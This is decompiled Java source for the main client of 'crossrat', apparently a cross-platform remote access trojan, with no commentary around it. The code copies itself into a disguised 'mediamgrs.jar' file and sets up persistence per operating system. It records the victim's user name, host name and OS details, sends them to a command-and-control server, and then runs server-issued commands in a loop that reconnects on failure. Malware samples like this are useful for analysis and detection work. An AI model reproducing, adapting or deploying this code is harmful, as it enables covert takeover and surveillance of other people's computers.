/*
 * Decompiled with CFR 0_124.
 */
package crossrat;

import crossrat.a;
import crossrat.b;
import crossrat.c;
import crossrat.d;
import crossrat.e;
import crossrat.f;
import crossrat.g;
import crossrat.h;
import crossrat.i;
import crossrat.j;
import crossrat.k;
import java.awt.GraphicsEnvironment;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintStream;
import java.io.Reader;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URL;
import java.net.URLDecoder;
import java.security.CodeSource;
import java.security.ProtectionDomain;
import java.util.UUID;
import java.util.prefs.Preferences;

public class client {
    /*
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     * Lifted jumps to return sites
     */
    public static void main(String[] object) {
        object = a.c.b();
        object3 = "java.io.tmpdir";
        object3 = System.getProperty("java.io.tmpdir");
        object4 = client.class.getProtectionDomain().getCodeSource().getLocation().getPath();
        object4 = URLDecoder.decode((String)object4, "UTF-8");
        object4 = new File((String)object4);
        k.K = "";
        if (object.a() == a.c.a) {
            k.K = String.valueOf(object3) + "\\";
        } else if (object.a() == a.c.b) {
            object = System.getProperty("user.home");
            k.K = String.valueOf(object) + "/Library/";
        } else {
            k.K = "/usr/var/";
        }
        object = new File(String.valueOf(k.K) + "mediamgrs.jar");
        try {
            org.a.a.a.b.a((File)object4, (File)object);
        }
        catch (Exception v0) {
            object3 = v0;
            v0.printStackTrace();
        }
        try {
            bl = true;
            arrstring = object.toString();
            object = "mediamgrs";
            object2 = a.c.b();
            if (object2.a() == a.c.a) {
                object = new b.e((String)object, (String)arrstring, true);
            } else if (object2.a() == a.c.b) {
                object = new b.c((String)object, (String)arrstring, true);
            } else if (object2.d() && !GraphicsEnvironment.getLocalGraphicsEnvironment().isHeadlessInstance()) {
                object = new b.d((String)object, (String)arrstring, true);
            } else {
                if (object2.d() == false) throw new RuntimeException("Unknown operating system " + object2.c());
                object = new b.b((String)object, (String)arrstring, true);
            }
            object.a();
        }
        catch (Exception v1) {
            object3 = v1;
            v1.printStackTrace();
        }
        k.h = Preferences.userRoot();
        k.g = k.h.get("UID", null);
        if (k.g == null) {
            k.f = UUID.randomUUID();
            k.g = k.f.toString();
            k.h.put("UID", k.g);
        }
        object3 = System.getProperty("os.name");
        object4 = System.getProperty("os.version");
        object = System.getProperty("user.name");
        object5 = InetAddress.getLocalHost();
        object5 = object5.getHostName();
        object5 = String.valueOf(object) + "^" + (String)object5;
        block12 : do {
            try {
                do {
                    socket = new Socket(k.b, k.c);
                    socket.setSoTimeout(120000);
                    k.k = socket;
                    object = new DataOutputStream(socket.getOutputStream());
                    object.writeBytes(String.valueOf(k.g) + k.d + k.w + k.d + e.b() + k.d + (String)object3 + k.d + (String)object4 + k.d + (String)object5 + k.d + k.i + k.d + k.j + k.d + "&&&");
                    bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    printStream = new PrintStream(socket.getOutputStream(), true);
lbl-1000: // 2 sources:
                    try {}
                    catch (Exception v2) {
                        System.out.println("ERROR");
                        socket.close();
                        printStream.close();
                        bufferedReader.close();
                        bufferedReader.close();
                        printStream.close();
                        socket.close();
                        continue;
                    }
                    break block12;
                    break;
                } while (true);
            }
            catch (Exception v3) {
                try {
                    Thread.sleep(5000L);
                }
                catch (InterruptedException v4) {}
                continue;
            }
            break;
        } while (true);
        do {
            object = bufferedReader.readLine();
            try {
                arrstring = object.split("\\" + k.d);
                if (arrstring[0].equals(k.m)) {
                    new crossrat.e();
                    e.a();
                    object2 = new f();
                    object2.start();
                    continue;
                }
                if (arrstring[0].equals(k.n)) {
                    object = new c(arrstring[1]);
                    object.start();
                    continue;
                }
                if (arrstring[0].equals(k.o)) {
                    object = new a(arrstring[1]);
                    object.start();
                    continue;
                }
                if (arrstring[0].equals(k.p)) {
                    object = new b(arrstring[1], arrstring[2]);
                    object.start();
                    continue;
                }
                if (arrstring[0].equals(k.q)) {
                    object = new h(arrstring[1], arrstring[2]);
                    object.start();
                    continue;
                }
                if (arrstring[0].equals(k.r)) {
                    object = new d(k.b, k.c, arrstring[1], arrstring[2], arrstring[3], "0");
                    object.start();
                    continue;
                }
                if (arrstring[0].equals(k.s)) {
                    object = new d(k.b, k.c, arrstring[1], arrstring[2], arrstring[3], "1");
                    object.start();
                    continue;
                }
                if (arrstring[0].equals(k.t)) {
                    object = new g();
                    object.start();
                    continue;
                }
                if (arrstring[0].equals(k.u)) {
                    object = new j(k.b, k.c);
                    object.start();
                    continue;
                }
                if (!arrstring[0].equals(k.v)) ** GOTO lbl-1000
                object = new i(arrstring[1]);
                object.start();
            }
            catch (Exception v5) {
            }
        } while (true);
    }
}
